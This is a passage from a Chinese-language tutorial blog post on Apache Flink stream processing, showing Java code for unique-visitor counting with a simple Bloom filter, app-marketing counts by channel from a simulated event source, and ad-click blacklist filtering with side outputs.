.&lt;UserBehavior&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">                .withTimestampAssigner((event, timeStamp) -&gt; event.timeStamp * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        userBehaviorWatermark.filter(value -&gt; value.behavior.equals(<span class="string">&quot;pv&quot;</span>))</span><br><span class="line">                .map(<span class="keyword">new</span> MapFunction&lt;UserBehavior, Tuple2&lt;String,Long&gt;&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Long&gt; <span class="title">map</span><span class="params">(UserBehavior userBehavior)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="string">&quot;dummyKey&quot;</span>,userBehavior.userId);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .keyBy(value-&gt;value.f0)</span><br><span class="line">                .timeWindow(Time.minutes(<span class="number">60</span>))</span><br><span class="line">                <span class="comment">// 我们不应该等待窗口关闭才去做 Redis 的连接 -》 数据量可能很大，窗口的内存放不下</span></span><br><span class="line">                <span class="comment">// 所以这里使用了 触发窗口操作的API -- 触发器 trigger</span></span><br><span class="line">                .trigger(<span class="keyword">new</span> MyTrigger())</span><br><span class="line">                .process(<span class="keyword">new</span> UvCountWithBloom())</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTrigger</span> <span class="keyword">extends</span> <span class="title">Trigger</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Long</span>&gt;, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onElement</span><span class="params">(Tuple2&lt;String, Long&gt; stringLongTuple2, <span class="keyword">long</span> l, TimeWindow timeWindow, TriggerContext triggerContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TriggerResult.FIRE_AND_PURGE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onProcessingTime</span><span class="params">(<span class="keyword">long</span> l, TimeWindow timeWindow, TriggerContext triggerContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TriggerResult.CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onEventTime</span><span class="params">(<span class="keyword">long</span> l, TimeWindow timeWindow, TriggerContext triggerContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TriggerResult.CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">(TimeWindow timeWindow, TriggerContext triggerContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个布隆过滤器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bloom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Long cap;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bloom</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bloom</span><span class="params">(Long cap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cap = cap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">hash</span><span class="params">(String value,<span class="keyword">int</span> seed)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;value.length();i++) &#123;</span><br><span class="line">            result = result * seed + value.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result &amp; (cap-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bloom&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cap=&quot;</span> + cap +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UvCountWithBloom</span> <span class="keyword">extends</span> <span class="title">ProcessWindowFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Long</span>&gt;, <span class="title">UVCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以在这里提前定义和redis的链接，这里我就不定义了</span></span><br><span class="line">    <span class="comment">// 这里我们就定义一个map来表示，其实应该是利用redis的位图，本部分建议还是看原始仓库scala的代码</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;Long,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义bloom过滤器</span></span><br><span class="line">    <span class="keyword">public</span> Bloom bloom;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        bloom = <span class="keyword">new</span> Bloom(<span class="number">100L</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(String s, Context context, Iterable&lt;Tuple2&lt;String, Long&gt;&gt; elements, Collector&lt;UVCount&gt; out)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 因为是每来一条数据就判断一次，所以我们就可以直接用last获取到这条数据</span></span><br><span class="line">        String userId = elements.iterator().next().f1.toString();</span><br><span class="line">        <span class="comment">// 计算哈希</span></span><br><span class="line">        <span class="keyword">long</span> hash = bloom.hash(userId, <span class="number">61</span>);</span><br><span class="line">        <span class="comment">// 定义一个标志位，判断 redis 位图中有没有这一位</span></span><br><span class="line">        <span class="keyword">if</span> (!map.containsKey(hash)) &#123;</span><br><span class="line">            map.put(hash, map.getOrDefault(hash,<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        map.put(hash, map.get(hash)+<span class="number">1</span>);</span><br><span class="line">        out.collect(<span class="keyword">new</span> UVCount(Long.parseLong(userId),map.get(hash)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="市场营销商业指标"><a href="#市场营销商业指标" class="headerlink" title="市场营销商业指标"></a>市场营销商业指标</h3><h4 id="APP市场推广统计"><a href="#APP市场推广统计" class="headerlink" title="APP市场推广统计"></a>APP市场推广统计</h4><p>主要有两个知识点，一个是自定义数据源，这对测试来说，是一个很好的方式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimulateEventSource</span> <span class="keyword">extends</span> <span class="title">RichParallelSourceFunction</span>&lt;<span class="title">MarketingUserBehavior</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义是否运行的标识符</span></span><br><span class="line">    Boolean running = <span class="keyword">true</span>;</span><br><span class="line">    <span class="comment">// 定义渠道的集合</span></span><br><span class="line">    String[] channelSet = &#123;<span class="string">&quot;AppStore&quot;</span>, <span class="string">&quot;XiaomiStore&quot;</span>, <span class="string">&quot;HuaweiStore&quot;</span>, <span class="string">&quot;weibo&quot;</span>, <span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;tieba&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 定义用户行为的集合</span></span><br><span class="line">    String[] behaviorTypes = &#123;<span class="string">&quot;BROWSE&quot;</span>, <span class="string">&quot;CLICK&quot;</span>, <span class="string">&quot;PURCHASE&quot;</span>, <span class="string">&quot;UNINSTALL&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 定义随机数发生器</span></span><br><span class="line">    Random rand = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;MarketingUserBehavior&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> max = Long.MAX_VALUE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (count&lt;max &amp;&amp; running) &#123;</span><br><span class="line">            String userId = String.valueOf(rand.nextLong());</span><br><span class="line">            String behaviorType = behaviorTypes[rand.nextInt(behaviorTypes.length)];</span><br><span class="line">            String channel = channelSet[rand.nextInt(channelSet.length)];</span><br><span class="line">            <span class="keyword">long</span> timestamp = System.currentTimeMillis();</span><br><span class="line">            ctx.collect(<span class="keyword">new</span> MarketingUserBehavior(userId,behaviorType,channel,timestamp));</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        running = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另一个，在java中，keyby设计到的返回值要是过于复杂，如果不想定义pojo的话，还是要使用keyselector，否则可能会遇到错误。</p>
<p>完整代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个输入数据的样例类  保存电商用户行为的样例类</span></span><br><span class="line"><span class="comment">// case class MarketingUserBehavior(userId: String, behavior: String, channel: String, timestamp: Long)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarketingUserBehavior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String userId;</span><br><span class="line">    <span class="keyword">public</span> String behavior;</span><br><span class="line">    <span class="keyword">public</span> String channel;</span><br><span class="line">    <span class="keyword">public</span> Long timestamp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MarketingUserBehavior</span><span class="params">(String userId, String behavior, String channel, Long timestamp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userId = userId;</span><br><span class="line">        <span class="keyword">this</span>.behavior = behavior;</span><br><span class="line">        <span class="keyword">this</span>.channel = channel;</span><br><span class="line">        <span class="keyword">this</span>.timestamp = timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MarketingUserBehavior&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;userId=&#x27;&quot;</span> + userId + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, behavior=&#x27;&quot;</span> + behavior + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, channel=&#x27;&quot;</span> + channel + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, timestamp=&quot;</span> + timestamp +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义一个输出结果的样例类   保存 市场用户点击次数</span></span><br><span class="line"><span class="comment">// case class MarketingViewCount(windowStart: String, windowEnd: String, channel: String, behavior: String, count: Long)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarketingViewCount</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String windowStart;</span><br><span class="line">    <span class="keyword">public</span> String windowEnd;</span><br><span class="line">    <span class="keyword">public</span> String channel;</span><br><span class="line">    <span class="keyword">public</span> String behavior;</span><br><span class="line">    <span class="keyword">public</span> Long count;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MarketingViewCount</span><span class="params">(String windowStart, String windowEnd, String channel, String behavior, Long count)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.windowStart = windowStart;</span><br><span class="line">        <span class="keyword">this</span>.windowEnd = windowEnd;</span><br><span class="line">        <span class="keyword">this</span>.channel = channel;</span><br><span class="line">        <span class="keyword">this</span>.behavior = behavior;</span><br><span class="line">        <span class="keyword">this</span>.count = count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MarketingViewCount&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;windowStart=&#x27;&quot;</span> + windowStart + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, windowEnd=&#x27;&quot;</span> + windowEnd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, channel=&#x27;&quot;</span> + channel + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, behavior=&#x27;&quot;</span> + behavior + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, count=&quot;</span> + count +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppMarketingByChannel</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自定义数据源</span></span><br><span class="line">        DataStreamSource&lt;MarketingUserBehavior&gt; marketingUserBehaviorDataStreamSource = env.addSource(<span class="keyword">new</span> SimulateEventSource());</span><br><span class="line"></span><br><span class="line">        marketingUserBehaviorDataStreamSource.assignTimestampsAndWatermarks(WatermarkStrategy.&lt;MarketingUserBehavior&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">        .withTimestampAssigner((event,timeStamp)-&gt;event.timestamp))</span><br><span class="line">        .filter(value-&gt; !value.behavior.equals(<span class="string">&quot;UNINSTALL&quot;</span>))</span><br><span class="line">        .map(<span class="keyword">new</span> MapFunction&lt;MarketingUserBehavior, Tuple2&lt;Tuple2&lt;String,String&gt;,Long&gt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Tuple2&lt;Tuple2&lt;String,String&gt;, Long&gt; map(MarketingUserBehavior marketingUserBehavior) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="keyword">new</span> Tuple2&lt;&gt;(marketingUserBehavior.channel, marketingUserBehavior.behavior), <span class="number">1L</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .keyBy(<span class="keyword">new</span> KeySelector&lt;Tuple2&lt;Tuple2&lt;String, String&gt;, Long&gt;, Tuple2&lt;String, String&gt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Tuple2&lt;String, String&gt; <span class="title">getKey</span><span class="params">(Tuple2&lt;Tuple2&lt;String, String&gt;, Long&gt; tuple2LongTuple2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> tuple2LongTuple2.f0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .timeWindow(Time.minutes(<span class="number">60</span>),Time.seconds(<span class="number">10</span>))</span><br><span class="line">        .process(<span class="keyword">new</span> MarketingCountByChannel())</span><br><span class="line">        .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimulateEventSource</span> <span class="keyword">extends</span> <span class="title">RichParallelSourceFunction</span>&lt;<span class="title">MarketingUserBehavior</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义是否运行的标识符</span></span><br><span class="line">    Boolean running = <span class="keyword">true</span>;</span><br><span class="line">    <span class="comment">// 定义渠道的集合</span></span><br><span class="line">    String[] channelSet = &#123;<span class="string">&quot;AppStore&quot;</span>, <span class="string">&quot;XiaomiStore&quot;</span>, <span class="string">&quot;HuaweiStore&quot;</span>, <span class="string">&quot;weibo&quot;</span>, <span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;tieba&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 定义用户行为的集合</span></span><br><span class="line">    String[] behaviorTypes = &#123;<span class="string">&quot;BROWSE&quot;</span>, <span class="string">&quot;CLICK&quot;</span>, <span class="string">&quot;PURCHASE&quot;</span>, <span class="string">&quot;UNINSTALL&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 定义随机数发生器</span></span><br><span class="line">    Random rand = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;MarketingUserBehavior&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> max = Long.MAX_VALUE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (count&lt;max &amp;&amp; running) &#123;</span><br><span class="line">            String userId = String.valueOf(rand.nextLong());</span><br><span class="line">            String behaviorType = behaviorTypes[rand.nextInt(behaviorTypes.length)];</span><br><span class="line">            String channel = channelSet[rand.nextInt(channelSet.length)];</span><br><span class="line">            <span class="keyword">long</span> timestamp = System.currentTimeMillis();</span><br><span class="line">            ctx.collect(<span class="keyword">new</span> MarketingUserBehavior(userId,behaviorType,channel,timestamp));</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        running = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MarketingCountByChannel</span> <span class="keyword">extends</span> <span class="title">ProcessWindowFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>,<span class="title">String</span>&gt;,<span class="title">Long</span>&gt;,<span class="title">MarketingViewCount</span>,<span class="title">Tuple2</span>&lt;<span class="title">String</span>,<span class="title">String</span>&gt;, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Tuple2&lt;String, String&gt; stringStringTuple2, Context context, Iterable&lt;Tuple2&lt;Tuple2&lt;String, String&gt;, Long&gt;&gt; elements, Collector&lt;MarketingViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据 context 对象分别获取到 Long 类型的 窗口的开始和结束时间</span></span><br><span class="line">        <span class="comment">//context.window.getStart是长整形   所以new 一个 变成String类型</span></span><br><span class="line">        String startTs = String.valueOf(context.window().getStart());</span><br><span class="line">        String endTs = String.valueOf(context.window().getEnd());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取到 渠道</span></span><br><span class="line">        String channel = stringStringTuple2.f0;</span><br><span class="line">        <span class="comment">// 获取到 行为</span></span><br><span class="line">        String behaviorType = stringStringTuple2.f1;</span><br><span class="line">        <span class="comment">// 获取到 次数</span></span><br><span class="line">        <span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Tuple2&lt;Tuple2&lt;String, String&gt;, Long&gt; element : elements) &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        out.collect(<span class="keyword">new</span> MarketingViewCount(startTs, endTs, channel, behaviorType, count));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="页面广告分析"><a href="#页面广告分析" class="headerlink" title="页面广告分析"></a>页面广告分析</h4><p>按照省份划分点击量，比较常规的做法，具体代码详见代码仓库。</p>
<h4 id="过滤黑名单"><a href="#过滤黑名单" class="headerlink" title="过滤黑名单"></a>过滤黑名单</h4><p>相比上一个功能多了一个过滤动作，具体过滤规则由需求决定。</p>
<p>这里使用了旁路输出getSideOutput，这次接触到一个实际案例，收获还是很大的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义侧输出流报警信息样例类</span></span><br><span class="line"><span class="comment">// case class BlackListWarning(userId:Long,adId:Long,msg:String)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlackListWarning</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> userId;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> adId;</span><br><span class="line">    <span class="keyword">public</span> String msg;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BlackListWarning</span><span class="params">(<span class="keyword">long</span> userId, <span class="keyword">long</span> adId, String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userId = userId;</span><br><span class="line">        <span class="keyword">this</span>.adId = adId;</span><br><span class="line">        <span class="keyword">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BlackListWarning&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;userId=&quot;</span> + userId +</span><br><span class="line">                <span class="string">&quot;, adId=&quot;</span> + adId +</span><br><span class="line">                <span class="string">&quot;, msg=&#x27;&quot;</span> + msg + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdAnalysisByProvinceBlack</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; stringDataStreamSource = env.readTextFile(<span class="string">&quot;data/AdClickLog.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;AdClickEvent&gt; adLogStream = stringDataStreamSource.map(<span class="keyword">new</span> MapFunction&lt;String, AdClickEvent&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> AdClickEvent <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                String[] s1 = s.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> AdClickEvent(Long.parseLong(s1[<span class="number">0</span>]), Long.parseLong(s1[<span class="number">1</span>]), s1[<span class="number">2</span>], s1[<span class="number">3</span>], Long.parseLong(s1[<span class="number">4</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .assignTimestampsAndWatermarks(WatermarkStrategy.&lt;AdClickEvent&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">5</span>))</span><br><span class="line">        .withTimestampAssigner((event, timestamp) -&gt; event.timestamp * <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;AdClickEvent&gt; filterBlackListStream = adLogStream.keyBy(<span class="keyword">new</span> KeySelector&lt;AdClickEvent, Tuple2&lt;Long, Long&gt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Tuple2&lt;Long, Long&gt; <span class="title">getKey</span><span class="params">(AdClickEvent adClickEvent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(adClickEvent.userId, adClickEvent.adId);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .process(<span class="keyword">new</span> FilterBlackList(<span class="number">100L</span>));</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; process = filterBlackListStream</span><br><span class="line">                .keyBy(value -&gt; value.province)</span><br><span class="line">                .timeWindow(Time.minutes(<span class="number">60</span>), Time.seconds(<span class="number">5</span>))</span><br><span class="line">                .process(<span class="keyword">new</span> AdCount());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        process.print();</span></span><br><span class="line"></span><br><span class="line">        filterBlackListStream.getSideOutput(<span class="keyword">new</span> OutputTag&lt;BlackListWarning&gt;(<span class="string">&quot;BlackListOutputTag&quot;</span>)&#123;&#125;).print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterBlackList</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">Long</span>, <span class="title">Long</span>&gt;, <span class="title">AdClickEvent</span>, <span class="title">AdClickEvent</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> cnt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FilterBlackList</span><span class="params">(<span class="keyword">long</span> cnt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cnt = cnt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ValueState&lt;Long&gt; count;</span><br><span class="line">    ValueState&lt;Boolean&gt; state;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个状态，需要保存当前用户对当前广告的点击量 count</span></span><br><span class="line">    <span class="comment">// lazy val countState:ValueState[Long] = getRuntimeContext.getState(new ValueStateDescriptor[Long](&quot;count&quot;,classOf[Long]))</span></span><br><span class="line">    <span class="comment">// 定义一个标识位，用来表示用户是否已经在黑名单中</span></span><br><span class="line">    <span class="comment">// lazy val isSendState:ValueState[Boolean] = getRuntimeContext.getState(new ValueStateDescriptor[Boolean](&quot;is-sent&quot;,classOf[Boolean]))</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        count = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span 